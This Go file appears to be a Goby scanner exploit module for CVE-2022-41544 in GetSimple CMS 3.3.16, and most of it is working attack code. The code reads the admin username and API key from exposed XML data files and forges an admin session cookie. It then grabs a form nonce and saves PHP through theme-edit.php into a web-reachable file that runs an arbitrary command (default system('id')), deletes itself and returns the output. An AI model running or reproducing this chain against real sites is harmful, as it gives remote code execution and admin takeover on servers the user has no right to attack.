package exploits

import (
	"crypto/sha1"
	"encoding/hex"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "GetSimpleCMS theme-edit.php content Arbitrary code execution vulnerability (CVE-2022-41544)",
    "Description": "<p>GetSimple CMS is a content management system (CMS) written in the PHP language.</p><p>GetSimple CMS v3.3.16 has a security vulnerability that stems from the discovery of the remote Code execution (RCE) vulnerability through the edited_file parameter in admin/theme-edit.php.</p>",
    "Product": "GETSIMPLE-CMS",
    "Homepage": "http://get-simple.info/",
    "DisclosureDate": "2022-11-11",
    "Author": "tangyunmingt@gmail.com",
    "FofaQuery": "(body=\"content=\\\"GetSimple\" || body=\"Powered by GetSimple\")",
    "GobyQuery": "(body=\"content=\\\"GetSimple\" || body=\"Powered by GetSimple\")",
    "Level": "2",
    "Impact": "<p>GetSimple CMS v3.3.16 has a security vulnerability that stems from the discovery of the remote Code execution (RCE) vulnerability through the edited_file parameter in admin/theme-edit.php.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:http://get-simple.info/</p>",
    "References": [
        "https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2022-41544"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "code",
            "type": "input",
            "value": "system('id')",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|"
            ]
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2022-41544"
    ],
    "CNNVD": [
        "CNNVD-202210-1199"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "GetSimpleCMS 内容管理系统 theme-edit.php 文件 content 参数任意代码执行漏洞（CVE-2022-41544）",
            "Product": "GETSIMPLE-CMS",
            "Description": "<p>GetSimple CMS是一套使用PHP语言编写的内容管理系统（CMS）。</p><p>GetSimple CMS v3.3.16版本存在安全漏洞，该漏洞源于通过admin/theme-edit.php中的edited_file参数发现包含远程代码执行（RCE）漏洞。</p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"http://get-simple.info/\">http://get-simple.info/</a><br><br></p>",
            "Impact": "<p>GetSimple CMS v3.3.16版本存在安全漏洞，该漏洞源于通过admin/theme-edit.php中的edited_file参数发现包含远程代码执行（RCE）漏洞。</span><br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "GetSimpleCMS theme-edit.php content Arbitrary code execution vulnerability (CVE-2022-41544)",
            "Product": "GETSIMPLE-CMS",
            "Description": "<p>GetSimple CMS is a content management system (CMS) written in the PHP language.</p><p>GetSimple CMS v3.3.16 has a security vulnerability that stems from the discovery of the remote Code execution (RCE) vulnerability through the edited_file parameter in admin/theme-edit.php.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><a href=\"http://get-simple.info/\">http://get-simple.info/</a></span></p>",
            "Impact": "<p>GetSimple CMS v3.3.16 has a security vulnerability that stems from the discovery of the remote Code execution (RCE) vulnerability through the edited_file parameter in admin/theme-edit.php.</span><br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10767"
}`
	SHA1 := func(s string) string {
		o := sha1.New()
		o.Write([]byte(s))
		return hex.EncodeToString(o.Sum(nil))

	}

	GetVer1398764271 := func(host *httpclient.FixUrl) string {
		requestConfig := httpclient.NewGetRequestConfig("/admin/")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody, `<link rel="stylesheet" type="text/css" href="template/style.php?s=&amp;v=`){
				ver := regexp.MustCompile(`template/style.php\?s=&amp;v=(.+?)"`).FindStringSubmatch(resp.RawBody)

				return strings.Replace(ver[1], ".", "", -1)

			}

		}
		return ""

	}

	GetUserName1398764271 := func(host *httpclient.FixUrl) string {
		requestConfig := httpclient.NewGetRequestConfig("/data/users/admin.xml")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody, `<item><USR>`) && strings.Contains(resp.RawBody,`</NAME><PWD>`) && strings.Contains(resp.RawBody,`</EMAIL><HTMLEDITOR>`){
				user := regexp.MustCompile(`<USR>(.+?)</USR>`).FindStringSubmatch(resp.RawBody)
				return user[1]

			}
		}
		return ""
	}

	GetKey2398764271 := func(host *httpclient.FixUrl) string {
		requestConfig := httpclient.NewGetRequestConfig("/data/other/authorization.xml")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody, `<item><apikey>`) && strings.Contains(resp.RawBody,`</apikey></item>`) {
				key := regexp.MustCompile(`<!\[CDATA\[(.+?)]]>`).FindStringSubmatch(resp.RawBody)
				return key[1]
			}
		}
		return ""

	}
	GetCookie2398764271 := func(host *httpclient.FixUrl) string {
		key := GetKey2398764271(host)
		user := GetUserName1398764271(host)
		ver := GetVer1398764271(host)
		str := `getsimple_cookie_`+ver
		return "GS_ADMIN_USERNAME="+user+"; "+SHA1(str+key)+"="+SHA1(user+key)

	}

	GetNonce2398764271 := func(host *httpclient.FixUrl) string {
		cookie := GetCookie2398764271(host)
		requestConfig := httpclient.NewGetRequestConfig("/admin/theme-edit.php")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Cookie", cookie)
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody, `<input id="nonce" name="nonce" type="hidden" value="`) {
				nonce := regexp.MustCompile(`<input id="nonce" name="nonce" type="hidden" value="(.+?)"`).FindStringSubmatch(resp.RawBody)
				return nonce[1]
			}

		}
		return ""
	}

	WriteFile2398764271 := func(host *httpclient.FixUrl, code string) bool {
		cookie := GetCookie2398764271(host)
		nonce := GetNonce2398764271(host)
		requestConfig := httpclient.NewPostRequestConfig("/admin/theme-edit.php?t=Dimension&f=template.php")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Cookie", cookie)
		requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		requestConfig.Data = "nonce="+nonce+"&content=<?php+"+code+";@unlink(__FILE__)?>&edited_file=../a1b2n3.php&submitsave=Guardar+cambios"
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			return resp.StatusCode == 200
		}
		return false
	}

	Check2398764271 := func(host *httpclient.FixUrl, code string) bool {
		WriteFile2398764271(host,code)
		requestConfig := httpclient.NewGetRequestConfig("/a1b2n3.php")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody, `cab411e2d284e7b7027f8587513bd9cb`) {
				return true
			}

		}
		return false
	}





	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			if Check2398764271(u,`echo+md5(23343245123987654567890)`){
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			code := ss.Params["code"].(string)
			WriteFile2398764271(expResult.HostInfo,code)
			requestConfig := httpclient.NewGetRequestConfig("/a1b2n3.php")
			requestConfig.VerifyTls = false
			requestConfig.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, requestConfig); err == nil {
				expResult.Success = true
				expResult.Output = resp.RawBody

			}


			return expResult
		},
	))
}